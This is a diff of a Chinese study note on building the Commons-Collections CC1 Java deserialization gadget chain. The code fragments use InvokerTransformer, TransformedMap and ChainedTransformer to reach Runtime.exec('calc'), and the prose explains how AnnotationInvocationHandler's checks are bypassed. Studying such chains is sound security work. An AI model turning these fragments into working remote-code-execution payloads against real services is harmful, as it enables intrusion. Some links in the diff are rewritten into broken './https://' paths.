@@ -5,19 +5,41 @@ tags: JAVA
 categories: JAVA安全-JAVA反序列化
 ---
 
+## 前言
+
+学习路线：
+
+CC1->1(2)->6->3->4->2
+
 ## 环境搭建
 
-[jdk8u65下载链接](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
+[jdk8u65下载链接](./https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
 
 ![image-20250924172617142](./Commons-Collections篇01-CC1链/image-20250924172617142.png)
 
-[openjdk下载链接](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)
+[openjdk下载链接](./https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)
 
 ![image-20250924172630367](./Commons-Collections篇01-CC1链/image-20250924172630367.png)
 
 然后将`jdk8u65`的`src.zip`解压
 
 将`openjdk`下的`src\share\classes\sun`文件夹，赋值到`jdk8u65`的`src`下
+
+
+
+在`pom.xml`中加入
+
+```xml
+    <dependencies>
+        <dependency>
+            <groupId>commons-collections</groupId>
+            <artifactId>commons-collections</artifactId>
+            <version>3.2.1</version>
+        </dependency>
+    </dependencies>
+```
+
+
 
 ### 注意事项
 
@@ -104,8 +126,9 @@ HashMap<Object,Object> hashMap = new HashMap<>();
 ```java
 Runtime runtime = Runtime.getRuntime();
 InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
-        invokerTransformer.transform(Runtime.getRuntime());
+       
         HashMap<Object,Object> hashMap = new HashMap<>();
+        hashMap.put("value","aaa");
         Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);
 for (Map.Entry entry : decorateMap.entrySet()) {
             entry.setValue(runtime);
@@ -119,6 +142,8 @@ for (Map.Entry entry : decorateMap.entrySet()) {
 ![image-20250923135908964](./Commons-Collections篇01-CC1链/image-20250923135908964.png)![image-20250923135922087](./Commons-Collections篇01-CC1链/image-20250923135922087.png)
 
 `AnnotationInvocationHandler`是`default`类型，只能在该包下调用，所以要用反射
+
+后面`readObject`中还有两个if判断条件，所以这里还需要用构造函数给参数赋值来绕过if判断
 
 ```java
 Runtime runtime = Runtime.getRuntime();
@@ -186,9 +211,13 @@ Class c = Runtime.class;
 
 ## 解决问题 ② 进入到 setValue 方法
 
-这里调试无法进到这个代码里面的可以看上面的注意事项
+这里调试无法进到这个代码里面的可以看文章开头的注意事项
+
+![image-20250927180409168](Commons-Collections%E7%AF%8701-CC1%E9%93%BE/image-20250927180409168.png)
 
 ![image-20250923164418342](./Commons-Collections篇01-CC1链/image-20250923164418342.png)
+
+构造函数传入两个参数，`type`和`memberTypes`，`memberType`就是`type`参数实例化后的类型
 
 成员类型不能为空，并且可实例化
 
@@ -196,14 +225,20 @@ Class c = Runtime.class;
 
 ![image-20250923164614017](./Commons-Collections篇01-CC1链/image-20250923164614017.png)
 
-## 解决问题 ③ 进入到 setValue 方法
+## 解决问题 ③ 控制 setValue 参数
+
+最终传入的参数不是我们想要的，我们要传入的参数应该是`Runtime.class`所以要控制这个参数
+
+![image-20250927181153538](Commons-Collections%E7%AF%8701-CC1%E9%93%BE/image-20250927181153538.png)
 
 ![image-20250923164817021](./Commons-Collections篇01-CC1链/image-20250923164817021.png)
 
 - 构造函数是将对象放在`iConstant`中
-- transform方法无论传入什么都返回`iConstant`
+- `transform`方法无论传入什么都返回`iConstant`
 
-那么我们可以利用这一点，将 `AnnotationTypeMismatchExceptionProxy` 类作为 `transform()` 方法的参数，也就是这个无关的类，作为参数，我们先传入一个 `Runtime.class`，然后无论 `transform()` 方法会调用什么对象，都会返回 `Runtime.class`
+这里不是很容易懂，可以在`setvalue`处打个断点一步一步调试
+
+在链子的前半部分用不到这个`value`值，只有在`transform方法`时才会用到这个`value`值，因为要读取`Runtime.class`下的方法，正好`ConstatntTransformer`类的构造方法和`transform`方法可以重新定义value值
 
 只需要在创建`transformers`数组时，使用构造函数将`Runtime.class`传入，后面`transform`就都会调用`Runtime.class`
 
@@ -216,6 +251,10 @@ Transformer[] transformers = new Transformer[]{
         };
          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 ```
+
+## 调用链
+
+![image-20250927161552059](Commons-Collections%E7%AF%8701-CC1%E9%93%BE/image-20250927161552059.png)
 
 ## 最终代码
 
